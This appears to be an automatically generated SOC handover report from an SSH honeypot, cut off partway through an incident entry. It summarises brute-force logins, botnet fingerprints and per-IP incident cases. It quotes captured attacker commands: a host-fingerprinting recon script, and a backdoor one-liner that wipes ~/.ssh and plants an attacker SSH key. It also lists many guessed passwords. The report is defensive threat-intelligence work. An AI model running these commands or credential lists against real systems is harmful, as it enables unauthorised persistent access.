# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-25 |
| **Generated At** | 2026-08-25T14:51:01Z |
| **Shift Time** | 14:51 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **109** |
| Confirmed Threats | **98** |
| False Positives Filtered | **11** (10.1%) |
| Unique Attacker IPs | **30** |
| Countries of Origin | **17** |
| High Severity Cases | **58** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **51** |
| Malware Samples Analyzed | **2** HIGH · **20** MED · 22 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **66** |
| Unique Credential Pairs | **59** |
| Unique Usernames | **8** |
| Unique Passwords | **57** |
| Successful Auth Pairs | **60** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 38 |
| `ubuntu` | 14 |
| `345gs5662d34` | 3 |
| `admin` | 3 |
| `support` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 3 |
| `3245gs5662d34` | 3 |
| `admin` | 3 |
| `support` | 3 |
| `` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 3 |
| `admin` | `admin` | 3 |
| `support` | `support` | 3 |
| `root` | `` | 2 |
| `root` | `ixUIG4PR2J` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `ixUIG4PR2J` | `8.160.167.43` | 2026-08-25T10:56:25 |
| `ubuntu` | `Password123` | `217.60.255.130` | 2026-08-25T11:03:25 |
| `root` | `P@ssw0rd#` | `217.60.255.130` | 2026-08-25T11:03:29 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `65.49.1.222` | 2026-08-25T11:04:50 |
| `ubuntu` | `abc123*` | `217.60.255.130` | 2026-08-25T11:13:05 |
| `root` | `Admin-123` | `217.60.255.130` | 2026-08-25T11:13:10 |
| `ubuntu` | `June@123` | `217.60.255.130` | 2026-08-25T11:22:54 |
| `root` | `123Admin` | `217.60.255.130` | 2026-08-25T11:22:59 |
| `ubuntu` | `Team@123` | `217.60.255.130` | 2026-08-25T11:32:49 |
| `root` | `1qazxsw2` | `217.60.255.130` | 2026-08-25T11:32:53 |
| `steam` | `QWE123` | `178.27.90.142` | 2026-08-25T11:35:05 |
| `345gs5662d34` | `345gs5662d34` | `178.27.90.142` | 2026-08-25T11:35:08 |
| `steam` | `3245gs5662d34` | `178.27.90.142` | 2026-08-25T11:35:09 |
| `ubuntu` | `Qq123456!` | `183.82.111.224` | 2026-08-25T11:37:57 |
| `345gs5662d34` | `345gs5662d34` | `183.82.111.224` | 2026-08-25T11:38:00 |
| `ubuntu` | `3245gs5662d34` | `183.82.111.224` | 2026-08-25T11:38:02 |
| `me` | `1234` | `102.91.123.220` | 2026-08-25T11:38:22 |
| `345gs5662d34` | `345gs5662d34` | `102.91.123.220` | 2026-08-25T11:38:26 |
| `me` | `3245gs5662d34` | `102.91.123.220` | 2026-08-25T11:38:27 |
| `ubuntu` | `Change@123` | `217.60.255.130` | 2026-08-25T11:42:41 |
| `root` | `Qazwsxedc` | `217.60.255.130` | 2026-08-25T11:42:44 |
| `admin` | `admin` | `42.115.213.238` | 2026-08-25T11:46:13 |
| `root` | `123@@@` | `165.1.75.106` | 2026-08-25T11:47:03 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-08-25T11:47:03 |
| `support` | `support` | `176.53.159.196` | 2026-08-25T11:47:04 |
| `ubuntu` | `Qwerty@12345` | `217.60.255.130` | 2026-08-25T11:52:24 |
| `root` | `123qwe!@#` | `217.60.255.130` | 2026-08-25T11:52:28 |
| `ubuntu` | `Mani@123` | `217.60.255.130` | 2026-08-25T12:02:02 |
| `root` | `postgres@1234` | `217.60.255.130` | 2026-08-25T12:02:06 |
| `root` | `﻿------fuck------` | `180.101.149.231` | 2026-08-25T12:07:18 |
| `ubuntu` | `Ishan@123` | `217.60.255.130` | 2026-08-25T12:11:40 |
| `root` | `1234qwer!@#$QWER` | `217.60.255.130` | 2026-08-25T12:11:44 |
| `support` | `support` | `10.0.0.73` | 2026-08-25T12:11:57 |
| `root` | `123qwerty` | `80.94.92.55` | 2026-08-25T12:12:44 |
| `root` | `21` | `80.94.92.55` | 2026-08-25T12:15:12 |
| `root` | `321` | `80.94.92.55` | 2026-08-25T12:18:14 |
| `root` | `4321` | `80.94.92.55` | 2026-08-25T12:20:39 |
| `ubuntu` | `smart@123` | `217.60.255.130` | 2026-08-25T12:21:43 |
| `root` | `12345a@` | `217.60.255.130` | 2026-08-25T12:21:47 |
| `root` | `54321` | `80.94.92.55` | 2026-08-25T12:23:45 |
| `root` | `P4ssw0rd` | `80.94.92.55` | 2026-08-25T12:25:42 |
| `root` | `P4ssword` | `80.94.92.55` | 2026-08-25T12:27:30 |
| `root` | `P@ssw0rd` | `80.94.92.55` | 2026-08-25T12:29:59 |
| `ubuntu` | `sweet` | `217.60.255.130` | 2026-08-25T12:31:36 |
| `root` | `zxcv123!` | `217.60.255.130` | 2026-08-25T12:31:40 |
| `root` | `Passw0rd` | `80.94.92.55` | 2026-08-25T12:31:46 |
| `admin` | `admin` | `10.0.0.73` | 2026-08-25T12:33:43 |
| `root` | `letmein` | `80.94.92.55` | 2026-08-25T12:34:16 |
| `root` | `p4ssword` | `80.94.92.55` | 2026-08-25T12:36:35 |
| `root` | `p@ssw0rd` | `80.94.92.55` | 2026-08-25T12:39:38 |
| `ubuntu` | `default` | `217.60.255.130` | 2026-08-25T12:41:09 |
| `root` | `P@ssw0rd1234567890` | `217.60.255.130` | 2026-08-25T12:41:13 |
| `root` | `passw0rd` | `80.94.92.55` | 2026-08-25T12:41:38 |
| `root` | `password` | `80.94.92.55` | 2026-08-25T12:44:32 |
| `root` | `qwerty` | `80.94.92.55` | 2026-08-25T12:47:02 |
| `ubuntu` | `changeme123` | `217.60.255.130` | 2026-08-25T12:50:45 |
| `root` | `Passw0rd123456!` | `217.60.255.130` | 2026-08-25T12:50:50 |
| `root` | `root1` | `80.94.92.55` | 2026-08-25T12:51:43 |
| `root` | `1q2w3e!@#` | `14.29.208.128` | 2026-08-25T12:53:11 |
| `root` | `root12` | `80.94.92.55` | 2026-08-25T12:53:27 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **109** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 43 |
| Go SSH scanner | 23 |
| Paramiko (Python) | 2 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `419da4c91ddb...` | Modern SSH client | 24 | 1 |
| `2ec37a7cc8da...` | Mirai/variant | 19 | 1 |
| `f555226df196...` | Mirai/variant | 10 | 4 |
| `a2de0f306611...` | Mirai/variant | 2 | 1 |
| `1b8acd46a07d...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `419da4c91ddb...` | libssh | 24 | 1 | Modern SSH client |
| `2ec37a7cc8da...` | Go SSH scanner | 19 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 10 | 4 | Mirai/variant |
| `95420f9d932d...` | libssh | 9 | 5 | — |
| `a2de0f306611...` | Paramiko (Python) | 2 | 1 | Mirai/variant |
| `1b8acd46a07d...` | Unknown | 1 | 1 | Modern SSH client |
| `f1e5e9d24e5e...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 17 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `80.94.92.55`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `183.82.111.224`, `14.29.208.128`, `102.91.123.220`, `178.27.90.142`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **30** |
| Unique ASNs | **28** |
| High-Risk ASNs | **21** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS271922` | LEIRIA HUGO LEANDRO (GEO FIBER) | 2 | LOW |
| `AS154383` | ZORNTECH WEB SOLUTIONS | 1 | HIGH |
| `AS680` | Verein zur Foerderung eines Deutschen Forschungsnetzes e.V. | 1 | HIGH |
| `AS398101` | GoDaddy.com, LLC | 1 | HIGH |
| `AS31898` | Oracle Corporation | 1 | HIGH |
| `AS12754` | Coolnet New Communication Provider | 1 | LOW |
| `AS204203` | Atrin Information & Communications Technology Company PJS | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (58)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-8a76c6947b2b

| Field | Detail |
|---|---|
| **Source IP** | `8.160.167[.]43` |
| **First Seen** | 2026-08-25 10:56 |
| **Last Seen** | 2026-08-25 10:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 10:56:24` | `cowrie.session.connect` |
| `2026-08-25 10:56:24` | `cowrie.client.version` |
| `2026-08-25 10:56:24` | `cowrie.client.kex` |
| `2026-08-25 10:56:25` | `cowrie.login.success` |
| `2026-08-25 10:56:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.160.167[.]43` to AbuseIPDB if not already reported
- [ ] Block `8.160.167[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-354736da55af

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 11:03 |
| **Last Seen** | 2026-08-25 11:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 11:03:24` | `cowrie.session.connect` |
| `2026-08-25 11:03:24` | `cowrie.client.version` |
| `2026-08-25 11:03:24` | `cowrie.client.kex` |
| `2026-08-25 11:03:25` | `cowrie.login.success` |
| `2026-08-25 11:03:26` | `cowrie.direct-tcpip.request` |
| `2026-08-25 11:03:26` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 11:03:26` | `cowrie.direct-tcpip.data` |
| `2026-08-25 11:03:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1946b73a3c9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 11:03 |
| **Last Seen** | 2026-08-25 11:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 11:03:28` | `cowrie.session.connect` |
| `2026-08-25 11:03:28` | `cowrie.client.version` |
| `2026-08-25 11:03:28` | `cowrie.client.kex` |
| `2026-08-25 11:03:29` | `cowrie.login.success` |
| `2026-08-25 11:03:29` | `cowrie.direct-tcpip.request` |
| `2026-08-25 11:03:29` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 11:03:29` | `cowrie.direct-tcpip.data` |
| `2026-08-25 11:03:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f0109242318

| Field | Detail |
|---|---|
| **Source IP** | `65.49.1[.]222` |
| **First Seen** | 2026-08-25 11:04 |
| **Last Seen** | 2026-08-25 11:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/92.0.4515.159 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 11:04:50` | `cowrie.session.connect` |
| `2026-08-25 11:04:50` | `cowrie.login.success` |
| `2026-08-25 11:04:51` | `cowrie.session.params` |
| `2026-08-25 11:04:51` | `cowrie.command.input` |
| `2026-08-25 11:04:51` | `cowrie.command.input` |
| `2026-08-25 11:04:51` | `cowrie.command.failed` |
| `2026-08-25 11:04:51` | `cowrie.command.input` |
| `2026-08-25 11:04:51` | `cowrie.command.failed` |
| `2026-08-25 11:04:51` | `cowrie.command.input` |
| `2026-08-25 11:04:51` | `cowrie.log.closed` |
| `2026-08-25 11:04:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.49.1[.]222` to AbuseIPDB if not already reported
- [ ] Block `65.49.1[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f37c57b3e6e7

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 11:13 |
| **Last Seen** | 2026-08-25 11:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 11:13:04` | `cowrie.session.connect` |
| `2026-08-25 11:13:04` | `cowrie.client.version` |
| `2026-08-25 11:13:04` | `cowrie.client.kex` |
| `2026-08-25 11:13:05` | `cowrie.login.success` |
| `2026-08-25 11:13:05` | `cowrie.direct-tcpip.request` |
| `2026-08-25 11:13:05` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 11:13:05` | `cowrie.direct-tcpip.data` |
| `2026-08-25 11:13:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f8bdd669eca

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 11:13 |
| **Last Seen** | 2026-08-25 11:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 11:13:08` | `cowrie.session.connect` |
| `2026-08-25 11:13:08` | `cowrie.client.version` |
| `2026-08-25 11:13:08` | `cowrie.client.kex` |
| `2026-08-25 11:13:10` | `cowrie.login.success` |
| `2026-08-25 11:13:10` | `cowrie.direct-tcpip.request` |
| `2026-08-25 11:13:10` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 11:13:10` | `cowrie.direct-tcpip.data` |
| `2026-08-25 11:13:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ccd2ffff7f9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 11:22 |
| **Last Seen** | 2026-08-25 11:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 11:22:53` | `cowrie.session.connect` |
| `2026-08-25 11:22:53` | `cowrie.client.version` |
| `2026-08-25 11:22:53` | `cowrie.client.kex` |
| `2026-08-25 11:22:54` | `cowrie.login.success` |
| `2026-08-25 11:22:54` | `cowrie.direct-tcpip.request` |
| `2026-08-25 11:22:54` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 11:22:54` | `cowrie.direct-tcpip.data` |
| `2026-08-25 11:22:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40787c3f1366

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 11:22 |
| **Last Seen** | 2026-08-25 11:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 11:22:58` | `cowrie.session.connect` |
| `2026-08-25 11:22:58` | `cowrie.client.version` |
| `2026-08-25 11:22:58` | `cowrie.client.kex` |
| `2026-08-25 11:22:59` | `cowrie.login.success` |
| `2026-08-25 11:22:59` | `cowrie.direct-tcpip.request` |
| `2026-08-25 11:22:59` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 11:22:59` | `cowrie.direct-tcpip.data` |
| `2026-08-25 11:22:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe63bf4bccbb

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 11:32 |
| **Last Seen** | 2026-08-25 11:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 11:32:48` | `cowrie.session.connect` |
| `2026-08-25 11:32:48` | `cowrie.client.version` |
| `2026-08-25 11:32:48` | `cowrie.client.kex` |
| `2026-08-25 11:32:49` | `cowrie.login.success` |
| `2026-08-25 11:32:50` | `cowrie.direct-tcpip.request` |
| `2026-08-25 11:32:50` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 11:32:50` | `cowrie.direct-tcpip.data` |
| `2026-08-25 11:32:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b3be00ada8a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 11:32 |
| **Last Seen** | 2026-08-25 11:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 11:32:52` | `cowrie.session.connect` |
| `2026-08-25 11:32:52` | `cowrie.client.version` |
| `2026-08-25 11:32:52` | `cowrie.client.kex` |
| `2026-08-25 11:32:53` | `cowrie.login.success` |
| `2026-08-25 11:32:53` | `cowrie.direct-tcpip.request` |
| `2026-08-25 11:32:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 11:32:53` | `cowrie.direct-tcpip.data` |
| `2026-08-25 11:32:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a9d0f6950c1

| Field | Detail |
|---|---|
| **Source IP** | `178.27.90[.]142` |
| **First Seen** | 2026-08-25 11:35 |
| **Last Seen** | 2026-08-25 11:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 11:35:05` | `cowrie.session.connect` |
| `2026-08-25 11:35:05` | `cowrie.client.version` |
| `2026-08-25 11:35:05` | `cowrie.client.kex` |
| `2026-08-25 11:35:05` | `cowrie.login.success` |
| `2026-08-25 11:35:06` | `cowrie.session.params` |
| `2026-08-25 11:35:06` | `cowrie.command.input` |
| `2026-08-25 11:35:06` | `cowrie.command.failed` |
| `2026-08-25 11:35:06` | `cowrie.log.closed` |
| `2026-08-25 11:35:07` | `cowrie.session.params` |
| `2026-08-25 11:35:07` | `cowrie.command.input` |
| `2026-08-25 11:35:07` | `cowrie.session.file_download` |
| `2026-08-25 11:35:07` | `cowrie.log.closed` |
| `2026-08-25 11:35:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.27.90[.]142` to AbuseIPDB if not already reported
- [ ] Block `178.27.90[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55fcae92b261

| Field | Detail |
|---|---|
| **Source IP** | `178.27.90[.]142` |
| **First Seen** | 2026-08-25 11:35 |
| **Last Seen** | 2026-08-25 11:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 11:35:07` | `cowrie.session.connect` |
| `2026-08-25 11:35:07` | `cowrie.client.version` |
| `2026-08-25 11:35:07` | `cowrie.client.kex` |
| `2026-08-25 11:35:08` | `cowrie.login.success` |
| `2026-08-25 11:35:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.27.90[.]142` to AbuseIPDB if not already reported
- [ ] Block `178.27.90[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36ae2e6acd74

| Field | Detail |
|---|---|
| **Source IP** | `178.27.90[.]142` |
| **First Seen** | 2026-08-25 11:35 |
| **Last Seen** | 2026-08-25 11:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 11:35:08` | `cowrie.session.connect` |
| `2026-08-25 11:35:08` | `cowrie.client.version` |
| `2026-08-25 11:35:08` | `cowrie.client.kex` |
| `2026-08-25 11:35:09` | `cowrie.login.success` |
| `2026-08-25 11:35:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.27.90[.]142` to AbuseIPDB if not already reported
- [ ] Block `178.27.90[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b60d6bccb691

| Field | Detail |
|---|---|
| **Source IP** | `183.82.111[.]224` |
| **First Seen** | 2026-08-25 11:37 |
| **Last Seen** | 2026-08-25 11:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
